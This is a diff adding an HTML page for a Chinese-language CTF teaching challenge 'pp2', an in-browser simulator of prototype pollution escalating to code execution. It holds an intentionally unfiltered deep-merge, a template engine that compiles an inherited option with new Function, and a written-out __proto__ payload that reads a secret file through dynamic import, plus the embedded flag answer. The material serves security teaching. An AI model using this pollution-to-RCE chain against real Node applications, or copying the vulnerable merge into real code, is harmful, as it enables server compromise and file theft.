@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>pp2 · 污染到 RCE（离线模拟器） | CTF 教学靶场</title>
+<style>
+:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
+*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
+.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
+.badge{display:inline-block;background:#c084fc;color:#2e1065;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
+.badge2{display:inline-block;background:#fbbf24;color:#291800;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;margin-left:6px}
+h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
+.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
+.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
+pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
+pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
+code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
+textarea{width:100%;min-height:110px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,monospace;font-size:13px}
+input[type=text]{width:70%;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
+button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer;margin:2px 4px 2px 0}
+button:hover{filter:brightness(1.15)}
+details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
+summary{cursor:pointer;color:var(--warn);font-weight:600}
+table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
+.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
+footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
+.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
+#out{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px 14px;margin-top:10px;font-size:14px;white-space:pre-wrap;word-break:break-all;min-height:24px}
+.pathbox{background:#052e16;border:1px solid #14532d;color:#bbf7d0;border-radius:8px;padding:10px 14px;margin-top:12px;font-size:14px}
+a{color:var(--acc)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header><span class="badge">原型链污染 · 第 2 关</span><span class="badge2">离线模拟器 · 真实 JS 污染</span>
+<h1>星帆周刊 · 站点配置与模板预览</h1>
+<div class="meta">难度：★★★★★ 高阶 | 关卡 ID：<code>pp2</code> · 运行时：静态页 + 浏览器内真实 JS 引擎（无 Node 后端）</div></header>
+
+<section class="card"><h2>为什么这一关是"离线模拟器"</h2>
+<p>原型链污染与 <code>new Function</code> 代码生成只能在 JavaScript 里真实发生。本页把原 Node 服务端（<code>_original/server.js</code>）的 <b>deepMerge、模板引擎与配置对象逐字搬进了你的浏览器</b>：污染真实发生在当前页面的 <code>Object.prototype</code> 上，注入的代码由<b>真实的 <code>new Function</code></b> 执行。</p>
+<p>唯一的模拟成分：浏览器没有 Node 的模块系统，模拟器把代码里的动态 <code>import('x')</code> 映射到页面内置的伪模块——<code>fs</code> 读取的是页面内置的模拟文件系统（VFS），机密文件就在里面。</p></section>
+
+<section class="card"><h2>题目描述</h2>
+<p>上一关（pp1）你污染了 <code>Object.prototype</code> 翻转了一个布尔开关。这一关把它变成<b>任意代码执行</b>。</p>
+<p>星帆周刊有两个功能：</p>
+<ul>
+<li><b>站点配置</b>：JSON 深合并进 config（lodash.merge 风格——同样的老毛病）；</li>
+<li><b>模板预览</b>：迷你模板引擎。它渲染时会读一个<b>默认选项对象的 prepend 字段</b>，
+    把它拼进动态生成的函数体（这个设计"致敬"了 ejs 的 <code>outputFunctionName</code>——CVE-2019-17443 等一票 RCE 的源头）。</li>
+</ul>
+<div class="pathbox">🗂️ 模拟服务器上藏着机密文件：<code>/srv/pp2/flag_pp2.txt</code>（让注入的代码读到它就是 flag）</div></section>
+
+<section class="card"><h2>实验区（deepMerge 与 new Function 都在页面里真实运行）</h2>
+<p>模板（占位符 {name}；禁止反引号与 \${，防止直接模板注入——本题要你走污染这条路）：</p>
+<input type="text" id="tpl" value="周刊预览：{name}">
+<button onclick="doRender()">渲染预览</button>
+<p style="margin-top:14px">配置 JSON（深合并进 config）：</p>
+<textarea id="j">{
+  "site": { "theme": "light" }
+}</textarea><br>
+<button onclick="save()">保存配置</button>
+<button onclick="state()">查看状态（config + 污染检测）</button>
+<button onclick="reset()">清理污染</button>
+<div id="out">（结果区）</div></section>
+
+<section class="card"><h2>知识点讲解</h2>
+<p>模板引擎的代码生成（漏洞②，默认参数从原型继承；与原服务端一致，仅 <code>import()</code> 改写一行是模拟器适配）：</p>
+<pre>function render(tpl, data, opts) {
+  opts = opts || {};                    // 空 options 对象
+  const prepend = opts.prepend || '';   // ← 污染后：Object.prototype.prepend 参与拼码
+  const code = String(prepend).replace(/\bimport\s*\(/g, '__import(');  // 模拟器：import() → 内置伪模块
+  const fn = new Function('data', '__import', code + 'return \`'+tpl+'\`;');
+  return fn(data, __import);
+}</pre>
+<p>完整链路（merge 漏洞 × 代码生成漏洞）：</p>
+<pre>保存配置  {"__proto__":{"prepend":"return import('fs').then(m=>m.readFileSync('/srv/pp2/flag_pp2.txt','utf8'));"}}
+渲染预览  →  new Function 里第一行就是注入的 return → import('fs') 读文件 → Promise 结果回显</pre>
+<p>真实世界对应物：</p>
+<ul>
+<li><b>ejs + lodash.merge</b>（或 qs/querystring 解析 + 任何 deep-merge）：污染 <code>outputFunctionName</code>/<code>escapeFunction</code> 等
+    "会进编译代码"的选项 → RCE（2019 年起大量 Node CTF 的模板题）。</li>
+<li>污染 <code>child_process</code> 的 options / <code>NODE_OPTIONS</code> / <code>shell</code> 字段达成命令执行。</li>
+<li>历史注脚：经典 payload <code>process.mainModule.require('child_process')</code> 在 Node 22+ 已随 mainModule 移除而失效，
+    取而代之的是<b>动态 import()</b>——本题演示的就是它（引擎侧对渲染结果做 Promise 兼容后，异步读文件的结果可以直达响应；模拟器里同样是 Promise 回显）。</li>
+</ul>
+<p>模拟器与真实环境的差异（教学注记）：真实 ejs/Node 引擎不会把 Promise 结果回显，攻击者用<b>副作用</b>落地——写文件、回连 OOB、直接起进程；本页为了教学把异步结果直接显示在结果区，技术内核（污染 → 拼码 → 执行）完全一致。</p></section>
+
+<section class="card"><h2>渐进提示</h2>
+<details><summary>提示 1：先确认两个功能都正常</summary><p>保存 <code>{"site":{"theme":"light"}}</code> 后看状态；渲染 <code>周刊预览：{name}</code> 应输出"周刊预览：星尘读者"。模板本身禁止反引号/插值——直接模板注入这条路被堵死。</p></details>
+<details><summary>提示 2：找到"会进代码"的字段</summary><p>render 的 opts 是个空对象——它和 pp1 的 gate 一样会"继承"原型上的键。知识区代码里的 <code>prepend</code> 会被原样拼进 new Function 的函数体。</p></details>
+<details><summary>提示 3：payload</summary><p>配置 JSON 提交 <code>{"__proto__":{"prepend":"return import('fs').then(m=>m.readFileSync('/srv/pp2/flag_pp2.txt','utf8'));"}}
+</code>（路径见页面顶部绿框），然后渲染任意模板（如 <code>x</code>），结果区即文件内容。</p></details>
+</section>
+
+<section class="card"><h2>提交 Flag</h2>
+<form id="flagForm" class="flagrow" onsubmit="return false">
+<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
+<button onclick="submitFlag()">提交</button></form><div id="flagResult"></div></section>
+
+<nav class="nav"><a href="../pp1">← 上一关：pp1</a><a href="../graphql1">下一关：graphql1 · 内省泄露 →</a></nav>
+<footer>CTF Web 教学式靶场 · F 组 · 仅用于安全学习 · 本关为离线模拟器（new Function 真实执行，fs 为页面内置 VFS）</footer></div>
+
+<script>
+// ===================== 模拟器本体 =====================
+// deepMerge / config / render 与原 Node 服务端（_original/server.js）逐字一致；
+// 唯一适配：动态 import('x') 在浏览器里没有模块系统，改写为 __import('x')，
+// 由下方 VFS（模拟文件系统）与伪 fs 模块兜着。
+
+// —— 站点配置（settings 合并的目标） ——
+var config = { site: { name: '星帆周刊', theme: 'dark', lang: 'zh' } };
+
+// —— 漏洞①：lodash.merge 风格的朴素深合并（真实执行，不过滤 __proto__） ——
+function deepMerge(dst, src) {
+  for (const k in src) {
+    if (src[k] !== null && typeof src[k] === 'object' && !Array.isArray(src[k])) {
+      if (dst[k] === null || typeof dst[k] !== 'object') dst[k] = {};
+      deepMerge(dst[k], src[k]);
+    } else {
+      dst[k] = src[k];
+    }
+  }
+  return dst;
+}
+
+// —— 模拟文件系统（VFS）：机密文件在内，只能靠注入代码“读” ——
+var VFS = {
+  '/srv/pp2/flag_pp2.txt': 'flag{pp2_dddb0dcd}',
+  '/srv/pp2/README.md': '# 星帆周刊\n模拟文件系统（VFS）：这是浏览器离线模拟环境，只内置了少量文件。\n真正的机密在 /srv/pp2/flag_pp2.txt。\n',
+  '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'
+};
+
+// —— 模拟的 Node 模块系统：只内置 fs ——
+function __import(name) {
+  if (name === 'fs') {
+    return Promise.resolve({
+      readFileSync: function (p, enc) {
+        p = String(p).replace(/\\/g, '/');
+        if (Object.prototype.hasOwnProperty.call(VFS, p)) return VFS[p];
+        var err = new Error("ENOENT: no such file or directory, open '" + p + "'");
+        err.code = 'ENOENT';
+        throw err;
+      }
+    });
+  }
+  var err2 = new Error("Cannot find module '" + name + "'");
+  err2.code = 'MODULE_NOT_FOUND';
+  return Promise.reject(err2);
+}
+
+// —— 漏洞②：迷你模板引擎（选项对象从原型继承污染键；new Function 真实执行） ——
+function render(tpl, data, opts) {
+  opts = opts || {};                    // 空 options 对象
+  const prepend = opts.prepend || '';   // ← 污染点
+  const code = String(prepend).replace(/\bimport\s*\(/g, '__import(');   // 模拟器适配：import() → 伪模块
+  const fn = new Function('data', '__import', code + '\nreturn `' + tpl + '`;');
+  return fn(data, __import);
+}
+
+var BUILTIN_PROTO_KEYS = ['constructor','__defineGetter__','__defineSetter__','hasOwnProperty','__lookupGetter__','__lookupSetter__','isPrototypeOf','propertyIsEnumerable','toString','toLocaleString','valueOf'];
+
+var out = document.getElementById('out');
+function show(t){ out.textContent = t; }
+
+function doRender(){
+  var tpl = document.getElementById('tpl').value;
+  // 限制模板本身不能带代码语法：本题要求走"污染选项"这条路
+  if (/[`]|\$\{/.test(tpl)) { show('模板包含被禁止的语法（反引号 / 模板插值）——请走配置那条路。'); return; }
+  tpl = tpl.replace(/\{(\w+)\}/g, '${data.$1}');      // {name} → ${data.name}
+  try {
+    var result = render(tpl, { name: '星尘读者' }, undefined);   // opts 不传 → {} → 继承污染
+    // 渲染结果可能是 Promise（import() payload）——与原服务端一致做 Promise 兼容回显
+    Promise.resolve(result).then(function(v){ show(String(v)); })
+      .catch(function(e){ show('渲染错误: ' + (e && e.message ? e.message : String(e))); });
+  } catch (e) { show('渲染错误: ' + e.message); }
+}
+function save(){
+  var body;
+  try { body = JSON.parse(document.getElementById('j').value); }
+  catch (e) { show('JSON 解析失败：' + e.message); return; }
+  try {
+    deepMerge(config, body);                 // ← 原 POST /api/settings 的服务端逻辑
+    show(JSON.stringify({ ok: true, config: config }, null, 2));
+  } catch (e) { show('合并出错: ' + e.message); }
+}
+function state(){
+  try {
+    var polluted;
+    try { polluted = Object.prototype.hasOwnProperty.call(Object.prototype, 'prepend') || ('prepend' in Object.prototype); }
+    catch (e) { polluted = '检测失败(' + e.message + ')'; }
+    show(JSON.stringify({ config: config, prototype_polluted: polluted }, null, 2));
+  } catch (e) { show('查看出错（页面原型被你玩坏了？点「清理污染」试试）: ' + e.message); }
+}
+function reset(){
+  try {
+    Object.keys(Object.prototype).forEach(function(k){ if (BUILTIN_PROTO_KEYS.indexOf(k) < 0) delete Object.prototype[k]; });
+    if (Object.getPrototypeOf(Object.prototype) !== null) Object.setPrototypeOf(Object.prototype, null);
+    if (Object.prototype.constructor !== Object) { try { Object.prototype.constructor = Object; } catch (e) {} }
+    config = { site: { name: '星帆周刊', theme: 'dark', lang: 'zh' } };
+    show('已清理 Object.prototype 上的污染键，配置恢复默认。');
+  } catch (e) { show('清理出错，刷新页面即可完全复位: ' + e.message); }
+}
+function submitFlag(){
+  var v=document.getElementById('flagInput').value.trim();
+  var el=document.getElementById('flagResult');
+  if(!v){el.textContent='请输入 flag';return}
+  el.textContent='提交中...';
+  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=pp2&flag='+encodeURIComponent(v)})
+   .then(function(r){return r.text().then(function(t){
+      var msg='HTTP '+r.status+': '+t;
+      try{var j=JSON.parse(t);
+        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
+        else if(j.message!==undefined)msg=j.message;
+      }catch(e){}
+      el.textContent=msg;})})
+   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
+}
+</script></body></html>
